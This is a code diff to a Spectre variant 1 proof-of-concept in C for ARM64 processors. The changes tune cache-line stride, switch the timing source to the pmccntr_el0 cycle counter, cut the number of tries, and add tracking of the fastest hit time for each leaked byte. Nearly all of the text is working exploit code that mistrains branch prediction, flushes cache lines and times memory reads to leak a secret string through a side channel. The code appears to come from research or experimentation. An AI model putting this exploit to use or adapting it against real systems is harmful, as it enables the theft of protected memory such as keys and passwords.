@@ -17,7 +17,18 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
+
+static inline uint64_t read_pmccntr(void)
+{
+    uint64_t val;
+	asm volatile("mrs %0, pmccntr_el0" : "=r"(val));
+	return val;
+}
 unsigned int array1_size = 16;
+uint8_t result_char [40];
+uint8_t result_hit_time[40];
+uint8_t local_char_count[256];
+
 uint8_t unused1[64];
 uint8_t array1[160] = {
     1,
@@ -37,7 +48,7 @@ uint8_t array1[160] = {
     15,
     16};
 uint8_t unused2[64];
-uint8_t array2[256 * 512];
+uint8_t array2[256 * 128];
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 
@@ -47,22 +58,22 @@ void victim_function(size_t x)
 {
     if (x < array1_size)
     {
-        temp &= array2[array1[x] * 512];
+        temp &= array2[array1[x] * 128];
     }
 }
 
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD 10 /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD 8 /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
+void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int counter)
 {
     static int results[256];
     int tries, i, j, k, mix_i, junk = 0;
     size_t training_x, x;
-    register uint64_t time1, time2;
+    register uint64_t time1, time2, time_diff;
     volatile uint8_t *addr;
 
     for (i = 0; i < 256; i++)
@@ -70,12 +81,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
         results[i] = 0;
     }
 
-    for (tries = 999; tries > 0; tries--)
+    for (tries = 1; tries > 0; tries--)
     {
 
         /* Flush array2[256*(0..255)] from cache */
         for (i = 0; i < 256; i++){
-            asm volatile("dc civac, %0" : : "r"(&array2[i * 512]) : "memory");
+            asm volatile("dc civac, %0" : : "r"(&array2[i * 128]) : "memory");
             asm volatile("isb"); // Insert isb for serialization after cache flush
         }
             
@@ -97,6 +108,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
             x = training_x ^ (x & (malicious_x ^ training_x));
 
             /* Call the victim! */
+            if(j == 0){
+                for (i = 0; i < 256; i++){
+                    asm volatile("dc civac, %0" : : "r"(&array2[i * 128]) : "memory");
+                    asm volatile("isb"); // Insert isb for serialization after cache flush
+                }
+            }
             victim_function(x);
         }
 
@@ -104,15 +121,24 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
         for (i = 0; i < 256; i++)
         {
             mix_i = ((i * 167) + 13) & 255;
-            addr = &array2[mix_i * 512];
+            addr = &array2[mix_i * 128];
             asm volatile("isb"); // Serialize before reading the counter
-            asm volatile("MRS %0, cntvct_el0" : "=r"(time1));
+            //asm volatile("MRS %0, cntvct_el0" : "=r"(time1));
+            time1 = read_pmccntr();
             asm volatile("isb"); // Serialize after reading the counter
             junk = *addr;        /* MEMORY ACCESS TO TIME */
             asm volatile("isb"); // Serialize before reading the counter
-            asm volatile("MRS %0, cntvct_el0" : "=r"(time2));
+            //asm volatile("MRS %0, cntvct_el0" : "=r"(time2));
+            time2 = read_pmccntr();
             asm volatile("isb"); // Serialize after reading the counter
-            if ((time2 - time1) <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+            time_diff = time2 - time1;
+            //printf("hit time of char %d is %ld \n",mix_i,time_diff);
+            if(time_diff < result_hit_time[counter] && mix_i != array1[tries % array1_size] && mix_i >= 30){
+                printf("time update hit time %d at counter %d with char %d\n",time_diff,counter,mix_i);
+                result_hit_time[counter] = time_diff;
+                result_char[counter] = mix_i;
+            }
+            if ((time_diff) <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                 results[mix_i]++; /* cache hit - add +1 to score for this value */
         }
 
@@ -130,8 +156,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
                 k = i;
             }
         }
-        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+        // if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+        //     break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
     }
     results[0] ^= junk; /* use junk so code above won’t get optimized out*/
     value[0] = (uint8_t)j;
@@ -142,10 +168,15 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 int main(int argc, const char **argv)
 {
+
     size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
     int i, score[2], len = 40;
     uint8_t value[2];
 
+
+    for (i = 0; i < sizeof(result_hit_time); i++){
+        result_hit_time[i] = 20; //i assume hit time is 20 units
+    }
     for (i = 0; i < sizeof(array2); i++){
         array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
     }
@@ -157,17 +188,28 @@ int main(int argc, const char **argv)
     }
 
     printf("Reading %d bytes:\n", len);
+    int counter = 0;
     while (--len >= 0)
     {
         printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-        readMemoryByte(malicious_x++, value, score);
+        //printf("~~~~~~~~~~~~~~%d %c %d~~~~~~~~~~~~~~~\n",counter,*(secret+counter),*(secret+counter));
+        readMemoryByte(malicious_x++, value, score,counter);
+        
         printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
         printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 
-        if (score[1] > 0)
+        if (score[1] > 0){
+            printf("");
             printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+        }
+            
         printf("\n");
+        counter += 1;
     }
+
+    // for (i = 0; i < 40; i++){
+    //     printf("Char %d is: %c, hit time is: %d\n",i,result_char[i],result_hit_time[i]);
+    // }
     return (0);
 }
 
